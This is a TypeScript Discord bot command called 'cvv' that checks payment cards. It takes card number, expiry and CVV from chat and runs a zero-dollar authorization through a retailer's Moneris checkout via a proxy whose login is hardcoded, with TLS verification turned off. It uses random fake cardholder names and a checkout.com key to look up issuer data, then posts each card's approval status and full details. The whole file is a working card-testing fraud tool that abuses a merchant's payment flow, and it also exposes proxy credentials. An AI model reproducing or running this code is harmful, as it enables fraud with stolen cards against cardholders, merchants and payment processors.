import { SlashCommandBuilder, ChatInputCommandInteraction, EmbedBuilder } from "discord.js";
import axios from "axios";
import https from "https";

const PROXY_CONFIG = {
  host: "brd.superproxy.io",
  port: 33335,
  auth: {
    username: "brd-customer-hl_b34735e4-zone-datacenter_proxy1",
    password: "2rupnulv0s5o",
  },
};

const httpsAgent = new https.Agent({
  rejectUnauthorized: false,
});

const responseCodes: { [key: string]: string } = {
  "000-87": "Approved (Purchase Amount Only, No Cash Back allowed)",
  "001-85": "Approved w/o bal",
  "004-08": "Tran approved w/id",
  "010-10": "Partial Approval",
  "027-00": "Approved w/o balanc",
  "027-01": "Approved w/o balance",
  "027-85": "Approved w/o balance (No reason to decline a request for address verification, CVV2 verification, or credit voucher or merchandise return. Transaction should be treated as approved)",
  "028-11": "Approved VIP",
  "029-21": "Unable to authorize",
  "029-76": "Unable to authorize",
  "050-06": "Declined",
  "050-59": "Declined",
  "050-84": "Declined",
  "050-B1": "Declined",
  "050-B2": "Declined",
  "050-Z1": "Declined",
  "050-Z3": "Declined",
  "052-75": "Pin tries exceeded",
  "055-81": "Invalid tran",
  "069-30": "Bad message edit",
  "073-92": "Invalid destination",
  "074-63": "Unable to authorize",
  "074-82": "Unable to authorize",
  "074-83": "Unable to authorize",
  "074-86": "Unable to process",
  "074-88": "No Security box",
  "078-09": "Duplicate Tran",
  "078-94": "Duplicate tran",
  "113-68": "Timeout",
  "200-39": "Invalid Account",
  "200-52": "Ineligible account",
  "200-53": "Declined",
  "201-1A": "Error, incrt PIN",
  "201-55": "Error, incrt PIN",
  "201-70": "Error, incrt PIN",
  "416-79": "Declined Use Updated Card",
  "416-82": "Declined Use Updated Card",
  "416-83": "Declined /Use Updated Card",
  "421-04": "Declined Do Not Retry",
  "421-07": "Declined Do Not Retry",
  "421-12": "Declined Do Not Retry",
  "421-14": "Declined Do Not Retry",
  "421-15": "Declined Do Not Retry",
  "421-41": "Declined Do Not Retry",
  "421-43": "Declined Do Not Retry",
  "421-46": "Declined Do Not Retry",
  "421-57": "Declined Do Not Retry",
  "421-79": "Card Declined Do Not Retry",
  "421-82": "Card Declined/Do Not Retry",
  "421-83": "Card Declined Do Not Retry",
  "422-05": "Do not resubmit transaction",
  "422-82": "Usage limit reached",
  "422-R0": "Stop Pymt Do Not Retry",
  "422-R1": "Stop Pymt Do Not Retry",
  "422-R3": "Stop Pymt Do Not Retry",
  "423-6P": "Decline Verf Failed",
  "476-03": "Merchant not on file",
  "476-12": "Invalid Tran",
  "476-13": "Invaled adv amount",
  "476-15": "Invalid destination",
  "476-19": "Unable to authorize",
  "476-77": "Unable to authorize",
  "476-91": "Unable to process",
  "476-96": "Unable to process",
  "477-14": "Ineligible account",
  "478-41": "Capture",
  "479-04": "Capture",
  "480-43": "Capture;CAF status",
  "481-05": "Declined",
  "481-51": "Low funds",
  "481-57": "Invalid tran",
  "481-58": "Invalid tran",
  "481-62": "Restricted",
  "481-65": "Num times used",
  "481-79": "Transaction not allowed to be processed by cardholder",
  "481-80": "Invalid tran date",
  "481-82": "Invalid Transaction",
  "481-83": "Invalid Transaction",
  "481-93": "Declined",
  "482-54": "Expired card",
  "483-01": "Refer - Issue call",
  "483-02": "Refer - Issue call",
  "483-61": "Over daily limit",
  "483-N3": "Unable to authorize",
  "483-N4": "Unable to authorize",
  "483-N5": "Unable to process",
  "483-N7": "Unable to process",
  "483-N8": "Unable to authorize",
  "484-02": "Refer - Issue call",
  "485-78": "Not authorized",
  "486-81": "Unable to authorize",
  "492-65": "Number of times use",
  "000-00": "Approved with balances",
  "025-00": "Approved",
  "050-96": "Decline",
  "053-58": "Sharing not allowed",
  "055-40": "Invalid transaction",
  "057-62": "Lost or stolen card",
  "059-62": "Restricted status",
  "060-56": "Account not found",
  "069-06": "Bad message edit",
  "070-92": "No IDF",
  "074-91": "Unable to authorize",
  "076-51": "Insufficient funds",
  "082-65": "Num of times used limit",
  "096-82": "Pin data req",
  "100-91": "Unable to process tran",
  "101-91": "Issue call",
  "102-05": "Call",
  "107-05": "Daily usage reached",
  "206-56": "CAF not found",
  "427-07": "invalid merchant",
  "429-09": "Account error retry",
  "430-10": "expired Card",
  "434-15": "invalid cid or 4DBC",
  "435-16": "declined",
  "437-42": "declined",
  "438-50": "Declined",
  "439-51": "service error retry",
  "440-53": "call amex",
  "441-0A": "amt erro retry",
  "900-75": "PIN tries exceeded- capture",
  "901-54": "Expired card- capture",
  "902-05": "Neg capture card",
  "903-05": "CAF status 3- capture",
  "909-05": "Lost or stolen card",
};

const cvdCodes: { [key: string]: string } = {
  "1M": "Match",
  "1N": "No Match",
  "1P": "Not Processed",
  "1S": "CVD should be on the card, but Merchant has indicated that CVD is not present.",
  "1U": "Issuer is not a CVD participant",
  "1Y": "Match for AmEx/JCB only",
  "1D": "Invalid security code for AmEx/JCB",
  "Other": "Invalid response code",
};

function generateRandomString(length: number): string {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function parseJsonValue(source: string, leftDelim: string, rightDelim: string): string {
  const leftIndex = source.indexOf(leftDelim);
  if (leftIndex === -1) return "";
  const start = leftIndex + leftDelim.length;
  const rightIndex = source.indexOf(rightDelim, start);
  if (rightIndex === -1) return "";
  return source.substring(start, rightIndex);
}

export const data = new SlashCommandBuilder()
  .setName("cvv")
  .setDescription("CVV 0.00$ Authorization")
  .addStringOption((option) =>
    option
      .setName("card")
      .setDescription("Card details in format: CC|MM|YYYY|CVV")
      .setRequired(true)
  );

export async function execute(interaction: ChatInputCommandInteraction) {
  await interaction.deferReply();

  const cardInput = interaction.options.getString("card", true);
  console.log("[CVV] Card:", cardInput);
  const parts = cardInput.split("|");

  if (parts.length !== 4) {
    await interaction.editReply({
      content: "❌ Invalid format. Use: CC|MM|YYYY|CVV (e.g., 4111111111111111|12|2025|123)",
    });
    return;
  }

  const [cc, mm, yyyy, cvv] = parts.map((p) => p.trim());
  
  // Extract 2-digit year from input (handles both 2-digit and 4-digit years)
  let yy1: string;
  if (yyyy.length === 4) {
    // 4-digit year: take last 2 digits
    yy1 = yyyy.substring(2);
  } else if (yyyy.length === 2) {
    // 2-digit year: use as is
    yy1 = yyyy;
  } else {
    // Invalid year format
    await interaction.editReply({
      content: "❌ Invalid year format. Use YY or YYYY (e.g., 25 or 2025)",
    });
    return;
  }
  
  const yy = yy1; // For display purposes

  if (!cc || !mm || !yyyy || !cvv) {
    await interaction.editReply({
      content: "❌ All fields are required: CC|MM|YYYY|CVV",
    });
    return;
  }

  try {
    const N1 = generateRandomString(5);
    const N2 = generateRandomString(6);
    const cardholder = `${N1} ${N2}`;

    const embed = new EmbedBuilder()
      .setTitle("Moneris 0.00$ Authorization")
      .setColor(0x0099ff)
      .setDescription("Checking Card...")
      .addFields({ name: "Card", value: `\`${cc}|${mm}|${yyyy}|${cvv}\``, inline: true })
      .setTimestamp();

    await interaction.editReply({ embeds: [embed] });

    let ticket = "";
    let success = false;
    let responseCode = "";
    let isoResponseCode = "";
    let cvdResult = "";
    let responseMessage = "";
    let cvdMessage = "";

    try {
      const preloadResponse = await axios.get(
        "https://www.leevalley.com/api/moneris?grandTotal=16.90&action=preload",
        { 
          proxy: PROXY_CONFIG,
          httpsAgent: httpsAgent,
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          timeout: 10000
        }
      );

      // Handle both JSON object and string responses
      let responseData = preloadResponse.data;
      if (typeof responseData === 'object') {
        // If it's already an object, try to get ticket directly or stringify
        if (responseData.ticket) {
          ticket = responseData.ticket;
        } else {
          // Stringify to parse as string
          responseData = JSON.stringify(responseData);
          ticket = parseJsonValue(responseData, '"ticket":"', '"');
        }
      } else {
        // It's already a string
        ticket = parseJsonValue(String(responseData), '"ticket":"', '"');
      }

      if (!ticket) {
        console.error("[CVV] Failed to extract ticket");
        throw new Error("Failed to get ticket");
      }

      await axios.post(
        "https://gateway.moneris.com/chktv2/display/request.php",
        `ticket=${ticket}&action=process_transaction&cardholder=${cardholder}&pan=${cc}&expiry_date=${mm}${yy1}&card_data_key=new&cvv=${cvv}`,
        { 
          proxy: PROXY_CONFIG,
          httpsAgent: httpsAgent,
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          timeout: 15000
        }
      );

      const receiptResponse = await axios.get(
        `https://www.leevalley.com/api/moneris?grandTotal=1.90&action=receipt&ticket=${ticket}`,
        { 
          proxy: PROXY_CONFIG,
          httpsAgent: httpsAgent,
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          timeout: 10000
        }
      );

      // Handle both JSON object and string responses
      let receiptData: string;
      if (typeof receiptResponse.data === 'object') {
        receiptData = JSON.stringify(receiptResponse.data);
      } else {
        receiptData = String(receiptResponse.data);
      }

      // Check success - handle both object and string formats
      if (typeof receiptResponse.data === 'object') {
        success = receiptResponse.data.success === true || receiptResponse.data.success === "true";
      } else {
        success = receiptData.includes('"success":"true"') || !receiptData.includes('"success":"false"');
      }

      // Try to extract from object first, then fall back to string parsing
      if (typeof receiptResponse.data === 'object') {
        responseCode = receiptResponse.data.response_code || parseJsonValue(receiptData, '"response_code":"', '"');
        isoResponseCode = receiptResponse.data.iso_response_code || parseJsonValue(receiptData, '"iso_response_code":"', '"');
        cvdResult = receiptResponse.data.cvd_result_code || parseJsonValue(receiptData, '"cvd_result_code":"', '"');
      } else {
        responseCode = parseJsonValue(receiptData, '"response_code":"', '"');
        isoResponseCode = parseJsonValue(receiptData, '"iso_response_code":"', '"');
        cvdResult = parseJsonValue(receiptData, '"cvd_result_code":"', '"');
      }

      const codeKey = `${responseCode}-${isoResponseCode}`;
      responseMessage = responseCodes[codeKey] || `Code: ${codeKey}`;
      cvdMessage = cvdCodes[cvdResult] || cvdCodes["Other"] || `CVD: ${cvdResult}`;
    } catch (error: any) {
      console.error("[CVV] Moneris error:", error.message);
    }

    let binInfo = "";
    let bin = "";
    let issuer = "";
    let cardType = "";
    let cardCategory = "";
    let productType = "";
    let issuerCountry = "";

    try {
      const checkoutResponse = await axios.post(
        "https://api.checkout.com/tokens",
        {
          type: "card",
          number: cc,
          expiry_month: parseInt(mm),
          expiry_year: parseInt(yyyy),
          cvv: "",
          phone: {},
          preferred_scheme: "",
          requestSource: "JS",
        },
        {
          headers: {
            accept: "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.6",
            authorization: "pk_bt7fsefsfszdmxj7sv5kky5ez46",
            "content-type": "application/json",
            origin: "https://js.checkout.com",
            referer: "https://js.checkout.com/",
            "user-agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
          },
          timeout: 10000
        }
      );

      const binData = checkoutResponse.data;
      const binFull = parseJsonValue(JSON.stringify(binData), '"bin":"', '"');
      bin = binFull.substring(0, 6);
      issuer = parseJsonValue(JSON.stringify(binData), '"issuer":"', '"');
      cardType = parseJsonValue(JSON.stringify(binData), '"card_type":"', '"');
      cardCategory = parseJsonValue(JSON.stringify(binData), '"card_category":"', '"');
      productType = parseJsonValue(JSON.stringify(binData), '"product_type":"', '"');
      issuerCountry = parseJsonValue(JSON.stringify(binData), '"issuer_country":"', '"');

      binInfo = `${issuer} - ${cardType} ${cardCategory} - ${productType} - ${issuerCountry}`;
    } catch (error: any) {
      console.error("[CVV] Checkout.com error:", error.message);
    }

    const isApproved = responseMessage.toLowerCase().includes("approved") || responseCode === "001" || success;

    const resultEmbed = new EmbedBuilder()
      .setTitle(isApproved ? "✅ Approved 0.00$ Moneris" : "❌ Declined 0.00$ Moneris")
      .setColor(isApproved ? 0x00ff00 : 0xff0000)
      .addFields(
        { name: "Card", value: `\`${cc}|${mm}|${yyyy}|${cvv}\``, inline: false }
      )
      .setTimestamp();

    if (responseCode && isoResponseCode) {
      resultEmbed.addFields({
        name: "Response Code",
        value: `${responseCode}-${isoResponseCode}: ${responseMessage}`,
        inline: false,
      });
    }

    if (cvdResult) {
      resultEmbed.addFields({ name: "CVD Result", value: `${cvdResult}: ${cvdMessage}`, inline: false });
    }

    if (binInfo) {
      resultEmbed.addFields(
        { name: "Bindata", value: binInfo, inline: false }
      );
    }

    if (!responseCode && !cvdResult) {
      resultEmbed.setDescription("⚠️ Could not process transaction. Gateway may be unavailable or card format invalid.");
    }

    const username = interaction.user.username || interaction.user.tag;

    resultEmbed.setFooter({ text: `Checked by ${username}` });

    await interaction.editReply({ embeds: [resultEmbed] });
  } catch (error: any) {
    console.error("[CVV] Error:", error.message);
    await interaction.editReply({
      content: `❌ Error testing card: ${error.message}`,
    });
  }
}

